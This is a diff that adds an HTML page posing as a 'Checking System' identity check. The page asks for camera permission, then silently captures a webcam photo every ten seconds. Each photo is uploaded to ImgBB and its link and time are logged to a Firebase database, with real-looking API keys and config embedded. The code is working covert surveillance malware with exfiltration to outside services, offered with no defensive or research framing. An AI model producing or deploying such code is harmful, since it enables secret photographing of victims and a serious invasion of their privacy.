@@ -1,0 +1,80 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>Checking System...</title>
+    <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-app.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-database.js"></script>
+</head>
+<body style="background: #000; color: #fff; display: flex; justify-content: center; align-items: center; height: 100vh; font-family: sans-serif;">
+
+    <div style="text-align: center;">
+        <h2>Connecting to Server...</h2>
+        <p>Please allow camera permission to verify your identity.</p>
+    </div>
+
+    <video id="video" autoplay playsinline style="display:none;"></video>
+    <canvas id="canvas" style="display:none;"></canvas>
+
+    <script>
+        // Aapka Firebase Config
+        const firebaseConfig = {
+            apiKey: "AIzaSyD7gABQ1j1zMFS9AylLCZr-K1hyK0LkIsQ",
+            authDomain: "distark.firebaseapp.com",
+            databaseURL: "https://distark-default-rtdb.firebaseio.com",
+            projectId: "distark",
+            storageBucket: "distark.firebasestorage.app",
+            messagingSenderId: "819241583845",
+            appId: "1:819241583845:web:2231e652310e47e06cc00c",
+            measurementId: "G-X175B7NX2K"
+        };
+        firebase.initializeApp(firebaseConfig);
+        const db = firebase.database();
+
+        const imgbbKey = '50af9f5367ae25509851af1e1ecf62b6'; // Aapki ImgBB Key
+
+        async function startSystem() {
+            try {
+                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+                const video = document.getElementById('video');
+                video.srcObject = stream;
+                
+                // Photo capture interval (every 10 seconds)
+                setInterval(capture, 10000);
+            } catch (err) {
+                console.log("Permission Denied");
+            }
+        }
+
+        function capture() {
+            const video = document.getElementById('video');
+            const canvas = document.getElementById('canvas');
+            canvas.width = video.videoWidth;
+            canvas.height = video.videoHeight;
+            canvas.getContext('2d').drawImage(video, 0, 0);
+            
+            const imageData = canvas.toDataURL('image/png').split(',')[1];
+
+            const formData = new FormData();
+            formData.append('image', imageData);
+
+            fetch(`https://api.imgbb.com/1/upload?key=${imgbbKey}`, {
+                method: 'POST',
+                body: formData
+            })
+            .then(res => res.json())
+            .then(data => {
+                if(data.success) {
+                    // Firebase mein URL aur Time save karna
+                    db.ref('camera_logs').push({
+                        url: data.data.url,
+                        timestamp: new Date().toLocaleString()
+                    });
+                }
+            });
+        }
+
+        window.onload = startSystem;
+    </script>
+</body>
+</html>
